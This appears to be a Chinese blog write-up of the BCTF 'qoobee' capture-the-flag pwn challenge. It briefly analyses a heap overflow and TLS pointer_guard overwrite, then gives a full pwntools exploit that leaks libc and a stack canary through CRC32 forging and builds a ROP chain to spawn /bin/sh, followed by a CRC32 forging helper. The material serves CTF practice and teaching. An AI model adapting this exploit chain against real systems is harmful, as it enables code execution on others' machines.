---  
layout: post  
title: "bctf_qoobee"  
date: 2015-10-13 21:43:06 +0800  
comments: true  
categories:   
---  
###0x00 程序分析  
程序有明显的堆溢出，和一个未被调用的栈溢出函数  
功能3可以泄漏任意地址的内容  
先malloc0x21000在tls前，溢出canary_guard和pointer_guard，把pointer_guard改成0x400d79^一个值  
使用功能2时会进入0x400d79，rop得到shell  
  
###0x01 exp  
  
	from pwn import *
	from binascii import *
	import crc32

	r = process('./qoobee')


	def leak(str, addr, dest):	#leak qword	
		n = (dest - addr -8)/4 + 2
		print n
		res = ''
		for i in range(n):
			r.recvuntil('# ')
			r.send('1\n')
			r.recvuntil('How many dounts you want? ')
			r.send('x'*2040 + p64(addr) + 'aaaaaaaa\n')
			r.recvuntil('# ')
			r.send('3\n')
			r.recvuntil('Input your local system timestamp: ')
			r.send('aaa\n')
			r.recvuntil('Response: ')
			x = int(r.recvuntil('\n')[:-1], 16)
			x = crc32.forge(x, str, 8)[8:]
	#		print hex(u32(x))
	#		print b2a_hex(x)
			str = str[4:]+x
			res += x
			addr += 4
	#		print 'str',b2a_hex(str)
	#		print b2a_hex(res)
		return u64(res[-8:])

	t = leak(p64(0x0000000000601e08), 0x602000, 0x602020)
	libc = t - 5868192
	m_end = libc + 17211392
	tls = m_end - 18624 + 0xc000 - 65536

	payload  = p64(tls)*((145200-0x200)/8)
	print 'tls',hex(tls)
	cookie = leak(p64(tls), tls, tls+0x28)
	print 'cookie',hex(cookie)
	p = leak(p64(tls), tls, tls+0x8)
	print 'p',hex(p)


	payload += p64(0)
	for i in range(0x200/8 - 1):
		tmp = leak(p64(0), tls-0x200, tls - 0x200 + (i+1)*8)
	#	print hex(tls - 0x200 + (i+1)*8), '->',hex(tmp)
		payload += p64(tmp)
	payload += 'a'*(145200%8) 
	payload += p64(tls) + p64(p) + p64(tls) + "cccccccc"*2 + p64(cookie) + p64(0x0400D79 ^ 0x69ea000000000020)


	r.recvuntil('# ')
	r.sendline('1')
	r.recvuntil('How many dounts you want? ')
	r.sendline('135168')
	r.recvuntil(':')
	r.sendline(payload)


	pop_rdi_ret = 0x0000000000401503 
	pop_rbp_ret = 0x0000000000400cb5
	leave_ret = 0x0000000000400ddf
	input = 0x0400E94
	addr = tls - 0x300
	wel = 0x400E55

	lib = ELF('/usr/lib/libc.so.6')
	puts = leak(p64(0x0000000000601e08), 0x602000, 0x602030)
	base = puts - lib.symbols['puts']
	i = lib.search('/bin/sh')
	binsh = i.next() + base 
	system_ = lib.symbols['system'] + base
	print 'binsh',hex(binsh)
	print 'system',hex(system_)

	payload2  = 'a'*0xf8
	payload2 += p64(cookie)
	payload2 += p64(cookie)	#ebp
	payload2 += p64(pop_rdi_ret)	
	payload2 += p64(binsh)	
	payload2 += p64(system_)	

	raw_input()
	r.recvuntil('# ')
	r.sendline('2')
	print r.recvuntil(':')
	r.sendline(payload2)

	r.interactive()



  
crc32  
  
	from struct import pack,unpack  
	import binascii  
  
	# Poly in "reversed" notation -- http://en.wikipedia.org/wiki/Cyclic_redundancy_check  
	POLY = 0xedb88320 # CRC-32-IEEE 802.3  
	#POLY = 0x82F63B78 # CRC-32C (Castagnoli)  
	#POLY = 0xEB31D82E # CRC-32K (Koopman)  
	#POLY = 0xD5828281 # CRC-32Q  
  
	def build_crc_tables():  
	    for i in range(256):  
		fwd = i  
		rev = i << 24  
		for j in range(8, 0, -1):  
		    # build normal table  
		    if (fwd & 1) == 1:  
			fwd = (fwd >> 1) ^ POLY  
		    else:  
			fwd >>= 1  
		    crc32_table[i] = fwd & 0xffffffff  
		    # build reverse table =)  
		    if rev & 0x80000000 == 0x80000000:  
			rev = ((rev ^ POLY) << 1) | 1  
		    else:  
			rev <<= 1  
		    rev &= 0xffffffff  
		    crc32_reverse[i] = rev  
  
	crc32_table, crc32_reverse = [0]*256, [0]*256  
	build_crc_tables()  
  
  
	def crc32(s): # same crc32 as in (binascii.crc32)&0xffffffff  
	  crc = 0xffffffff  
	  for c in s:  
	    crc = (crc >> 8) ^ crc32_table[(crc ^ ord(c)) & 0xff]  
	  return crc ^0xffffffff  
  
  
  
	def forge(wanted_crc, str, pos=None):  
	  if pos is None:  
	    pos = len(str)  
  
	  # forward calculation of CRC up to pos, sets current forward CRC state  
	  fwd_crc = 0xffffffff # <<<< PATCHED!  
	  for c in str[:pos]:  
	    fwd_crc = (fwd_crc >> 8) ^ crc32_table[(fwd_crc ^ ord(c)) & 0xff]  
  
	  # backward calculation of CRC up to pos, sets wanted backward CRC state  
	  bkd_crc = wanted_crc ^0xffffffff # <<<< PATCHED!  
	  for c in str[pos:][::-1]:  
	    bkd_crc = ((bkd_crc << 8)&0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ ord(c)  
  
	  # deduce the 4 bytes we need to insert  
	  for c in pack('<L',fwd_crc)[::-1]:  
	    bkd_crc = ((bkd_crc << 8)&0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ ord(c)  
  
	  res = str[:pos] + pack('<L', bkd_crc) + str[pos:]  
	  assert(crc32(res) == wanted_crc)  
	  return res  
  
  
###0x02 misc  
  
gdb 查找  
find  
